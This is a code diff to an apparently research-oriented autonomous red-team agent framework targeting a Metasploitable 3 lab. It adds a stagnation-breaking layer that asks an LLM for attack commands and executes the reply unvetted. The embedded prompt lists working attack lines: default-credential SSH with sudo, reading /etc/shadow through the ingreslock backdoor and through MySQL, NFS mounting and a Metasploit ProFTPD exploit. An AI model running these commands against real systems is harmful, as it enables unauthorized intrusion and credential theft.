@@ -441,6 +441,18 @@ class SmartCoach:
             self.ddqn_macro = DDQNMacro(config=ddqn_config, device="cpu")
         except Exception as e:
             logger.debug(f"DDQN macro init skipped for {agent_name}: {e}")
+
+        # =====================================================================
+        # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
+        # Uses gpt-5.2-codex for high-level reasoning when agents get stuck
+        # in a phase for too long without discoveries. Budget-controlled:
+        # max 3 calls/episode, 4-step cooldown between calls.
+        # =====================================================================
+        self._codex_meta_calls_episode = 0
+        self._codex_meta_max_per_episode = 3
+        self._codex_meta_cooldown = 0
+        self._codex_meta_phase_steps = 0
+        self._codex_meta_last_phase = None
     
     def _init_smart_mentor(self):
         """Initialize the smart mentor — GPT-only (Phase 6.9: Venice removed).
@@ -1189,6 +1201,189 @@ class SmartCoach:
             logger.debug(f"Mentor reasoning check failed: {e}")
         
         return None
+
+    # =====================================================================
+    # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
+    # =====================================================================
+
+    def _codex_meta_check(
+        self,
+        step_ctx: SmartStepContext,
+        current_phase: AttackPhase,
+        filtered_commands: List[CommandTemplate],
+    ) -> Optional[SmartDecisionResult]:
+        """
+        Layer 3: Codex Meta-Layer — Strategic stagnation-breaking with gpt-5.2-codex.
+
+        When an agent is stuck in a phase for too long without discoveries,
+        escalate to gpt-5.2-codex for high-level strategic guidance. This is
+        the top-tier reasoning layer: DDQN picks strategy, PPO picks tactics,
+        and Codex Meta overrides BOTH when they collectively stagnate.
+
+        Trigger thresholds (phase-specific):
+            EXPLOITATION: 10 steps (R58 EP5 showed 23-step grind)
+            PRIVILEGE_ESCALATION: 6 steps (R58 EP7/EP9 showed 10-12 step stalls)
+            LATERAL_MOVEMENT: 8 steps
+            Other phases: 15 steps
+
+        Budget: 3 calls/episode, 4-step cooldown between calls.
+        Only fires for offensive agents (RedAgent is the primary learner).
+        """
+        # Budget check
+        if self._codex_meta_calls_episode >= self._codex_meta_max_per_episode:
+            return None
+
+        # Cooldown check
+        if self._codex_meta_cooldown > 0:
+            self._codex_meta_cooldown -= 1
+            return None
+
+        # Track steps in current phase (independent of _stagnation_steps)
+        if current_phase != self._codex_meta_last_phase:
+            self._codex_meta_phase_steps = 0
+            self._codex_meta_last_phase = current_phase
+        self._codex_meta_phase_steps += 1
+
+        # Phase-specific stagnation thresholds
+        _CODEX_THRESHOLDS = {
+            AttackPhase.EXPLOITATION: 10,
+            AttackPhase.PRIVILEGE_ESCALATION: 6,
+            AttackPhase.LATERAL_MOVEMENT: 8,
+            AttackPhase.ENUMERATION: 12,
+            AttackPhase.POST_EXPLOITATION: 8,
+        }
+        threshold = _CODEX_THRESHOLDS.get(current_phase, 15)
+
+        if self._codex_meta_phase_steps < threshold:
+            return None
+
+        # Only fire on threshold crossing and every 5 steps after
+        if (self._codex_meta_phase_steps - threshold) % 5 != 0:
+            return None
+
+        # Only for offensive agents (Red is the primary attack learner)
+        if self.agent_role.get("role") != "offensive":
+            return None
+
+        # GPT must be available
+        if self.gpt_manager is None or self.gpt_manager.is_offline():
+            return None
+
+        # Build strategic context from discovery board and attack context
+        ctx = step_ctx.attack_context
+        discovery_board = step_ctx.state.get("discovery_board", {})
+        recent_cmds = (ctx.command_history or [])[-8:]
+
+        _ports = sorted(list(discovery_board.get("ports", set())))[:15]
+        _services = sorted(list(discovery_board.get("services", set())))[:10]
+        _creds = list(discovery_board.get("credentials", set()))[:5]
+        _shells = list(discovery_board.get("shells", set()))[:3]
+
+        # Include best chain from cross-episode memory for context
+        _chain_hint = ""
+        if self._best_chain:
+            _best_cmds = self._best_chain.get("commands", [])[:5]
+            _chain_hint = (
+                f"\nBest attack chain from past episodes (reward={self._best_chain.get('reward', 0):.0f}): "
+                + " → ".join(_best_cmds)
+            )
+
+        prompt = (
+            f"STRATEGIC STAGNATION ANALYSIS — Phase: {current_phase.name}\n"
+            f"Stuck for {self._codex_meta_phase_steps} steps without advancing.\n"
+            f"Target: {ctx.target} (Metasploitable 3)\n\n"
+            f"Current state:\n"
+            f"- Ports discovered: {_ports}\n"
+            f"- Services: {_services}\n"
+            f"- Credentials: {_creds if _creds else 'msfadmin:msfadmin (default)'}\n"
+            f"- Shells: {_shells}\n"
+            f"- Flags: shell={'YES' if ctx.state_flags.get('shell_obtained') else 'NO'}, "
+            f"root={'YES' if ctx.state_flags.get('root_shell_obtained') else 'NO'}, "
+            f"creds={'YES' if ctx.state_flags.get('credentials_known') else 'NO'}, "
+            f"hash={'YES' if ctx.state_flags.get('hash_known') else 'NO'}\n\n"
+            f"Recent commands tried (all failed to advance):\n"
+            + "\n".join(f"  {i+1}. {cmd[:80]}" for i, cmd in enumerate(recent_cmds))
+            + f"{_chain_hint}\n\n"
+            f"PROVEN MS3 ATTACK PATHS:\n"
+            f"1. SSH privesc: sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
+            f"msfadmin@{ctx.target} 'echo msfadmin | sudo -S id'\n"
+            f"2. Ingreslock root: {{ echo 'cat /etc/shadow'; sleep 2; }} | "
+            f"timeout 10 telnet {ctx.target} 1524\n"
+            f"3. MySQL dump: mysql -h {ctx.target} -u root -psploitme "
+            f"-e 'SELECT LOAD_FILE(\"/etc/shadow\")'\n"
+            f"4. NFS mount: showmount -e {ctx.target}; "
+            f"mount -t nfs {ctx.target}:/export /mnt\n"
+            f"5. ProFTPD exploit: msfconsole -q -x 'use exploit/unix/ftp/"
+            f"proftpd_modcopy_exec; set RHOSTS {ctx.target}; run'\n\n"
+            f"Output ONLY the single best command to break through from "
+            f"{current_phase.name}. No explanation, just the command."
+        )
+
+        try:
+            response = self.gpt_manager.gpt_request(
+                prompt=prompt,
+                task_type="strategic",  # Routes to gpt-5.2-codex
+                agent_id=self.agent_name,
+                max_tokens=200,
+            )
+
+            if response and isinstance(response, str) and len(response.strip()) > 5:
+                # Extract first line as the command
+                command = response.strip().split("\n")[0].strip()
+                # Clean up common LLM artifacts
+                command = command.lstrip("$ ").lstrip("> ").strip()
+                if command.startswith("```"):
+                    command = command.strip("`").strip()
+                if command.startswith("bash"):
+                    command = command[4:].strip()
+                # Replace target placeholders
+                command = command.replace("{target}", ctx.target)
+                command = command.replace("TARGET", ctx.target)
+                command = command.replace("<target>", ctx.target)
+                command = command.replace("<IP>", ctx.target)
+
+                # Validate: must look like a real command
+                if len(command) < 5 or command.lower().startswith(
+                    ("i ", "the ", "you ", "try ", "run ", "use ", "to ")
+                ):
+                    logger.debug(
+                        f"[CODEX-META] Rejected non-command response: {command[:60]}"
+                    )
+                    return None
+
+                self._codex_meta_calls_episode += 1
+                self._codex_meta_cooldown = 4  # Wait 4 steps before next call
+
+                logger.info(
+                    f"[CODEX-META][{self.agent_name}] Stagnation break at "
+                    f"{current_phase.name} step {self._codex_meta_phase_steps}: "
+                    f"{command[:80]}"
+                )
+
+                result = SmartDecisionResult(
+                    command=command,
+                    source="codex_meta",
+                    confidence=0.80,
+                    template_name=None,
+                    params={"target": ctx.target},
+                    reasoning=(
+                        f"[CODEX-META] Stagnation break: "
+                        f"{self._codex_meta_phase_steps} steps in {current_phase.name}"
+                    ),
+                    mentor_call=True,
+                    model_used="gpt-5.2-codex",
+                    mentor_reasoning=(
+                        f"[CODEX-META] Strategic override after "
+                        f"{self._codex_meta_phase_steps} steps in {current_phase.name}. "
+                        f"Call {self._codex_meta_calls_episode}/{self._codex_meta_max_per_episode}"
+                    ),
+                    phase=current_phase,
+                )
+                return result
+        except Exception as e:
+            logger.debug(f"[CODEX-META][{self.agent_name}] Call failed: {e}")
+
+        return None
     
     def decide(
         self,
@@ -1406,11 +1601,39 @@ class SmartCoach:
         # The crossover is controlled by a dynamic mentor_lead_rate that fades
         # from 35% to 15% as PPO builds confidence (Phase 6.5 tuning).
         # 
-        # Decision priority: Skill Library → Playbook → (Mentor OR PPO) → Registry
+        # Decision priority: Skill Library → Playbook → CODEX META → (Mentor OR PPO) → Registry
+        
+        # =====================================================================
+        # LAYER 3: CODEX META-LAYER — Strategic stagnation-breaking
+        # When stuck in a phase for too long, gpt-5.2-codex provides
+        # strategic guidance to break through. Budget: 3 calls/episode.
+        # Computed BEFORE the decision priority chain so it's available.
+        # =====================================================================
+        codex_meta_result = self._codex_meta_check(
+            step_ctx, current_phase, filtered_commands
+        )
+        
         if skill_result is not None:
             result = skill_result
         elif playbook_result is not None:
             result = playbook_result
+        elif codex_meta_result is not None:
+            result = codex_meta_result
+            # Store negative PPO trajectory: PPO/DDQN failed to break stagnation
+            if self._ppo_pending is not None:
+                if self.ppo_agent is not None:
+                    try:
+                        self.ppo_agent.store_transition(
+                            state=self._ppo_pending["state"],
+                            action=self._ppo_pending["action"],
+                            log_prob=self._ppo_pending["log_prob"],
+                            reward=-3.0,  # PPO failed to break stagnation
+                            value=self._ppo_pending["value"],
+                            done=False,
+                        )
+                    except Exception:
+                        pass
+                self._ppo_pending = None
         else:
             # Phase 6.5: Compute dynamic mentor_lead_rate
             # Starts at 35%, decays to 15% over ~50 episodes.
@@ -1655,7 +1878,7 @@ class SmartCoach:
         # Non-PPO decisions (playbook, registry, mentor, skill) still go through
         # the anti-repeat guard as before.
         # =========================================================================
-        ppo_bypass = (result.source in ("ppo", "privesc_escalation") and is_valid_role)
+        ppo_bypass = (result.source in ("ppo", "privesc_escalation", "codex_meta") and is_valid_role)
         
         # =========================================================================
         # PHASE 6.1: FAMILY-BASED ANTI-REPEAT WITH GRADED PENALTIES
@@ -4593,6 +4816,12 @@ class SmartCoach:
         # Phase 6.1: Reset stagnation counter
         self._stagnation_steps = 0
         self._last_phase = None
+
+        # Layer 3: Reset codex meta-layer counters
+        self._codex_meta_calls_episode = 0
+        self._codex_meta_cooldown = 0
+        self._codex_meta_phase_steps = 0
+        self._codex_meta_last_phase = None
 
         # R49/R52: Reset phase-stuck escalation trackers
         self._privesc_steps = 0
